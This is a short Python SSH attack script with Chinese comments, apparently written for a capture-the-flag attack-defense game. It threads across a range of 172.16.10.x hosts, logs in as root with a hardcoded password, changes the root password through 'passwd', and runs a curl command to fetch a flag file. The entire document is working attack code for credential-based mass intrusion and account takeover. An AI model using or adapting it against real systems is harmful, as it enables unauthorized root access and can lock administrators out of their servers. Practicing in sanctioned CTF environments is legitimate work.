#!/usr/bin/env python
# -*- coding:utf-8 -*-

import sys
import paramiko
import threading

#建立连接
def get_client(host, port, username, password):
    try:
        ssh_client =  paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(host, port, username, password, timeout = 3)
        return ssh_client
    #except Exception,e:
    #   print host + ' : ' + str(e)
    except:
       pass

#修改密码
def chg_passwd(ssh_client, username, newpassword):
    ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command('passwd ' + username)
    ssh_stdin.write(newpassword + '\n')
    ssh_stdin.flush()
    ssh_stdin.write(newpassword + '\n')
    ssh_stdin.flush()

#执行命令
def exec_cmd(ssh_client, command):
    ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(command)
    out = ssh_stdout.read()
    err = ssh_stderr.read()
    if out != '':
        return out.strip('\x09\x0d\x0a\x20')
    else:
        return err

#发起攻击
def launch_attack(host, port, username, password, newpassword, command):
    ssh_client = get_client(host, port, username, password)
    if ssh_client != None:
        chg_passwd(ssh_client, username, newpassword)
        data = exec_cmd(ssh_client, command)
        print host, ':', data
        ssh_client.close()

#流程主控
def main():
    port = 22
    username = 'root'
    password = 'Admin@0424'
    newpassword = 'Admin@0424'
    command = '/usr/bin/curl http://172.16.10.140/ctf/flag'
    for i in range(140, 150):
        host = '172.16.10.' + str(i)
        th = threading.Thread(target = launch_attack, args = (host, port, username, password, newpassword, command))
        th.start()

#main
if __name__ == '__main__':
    main()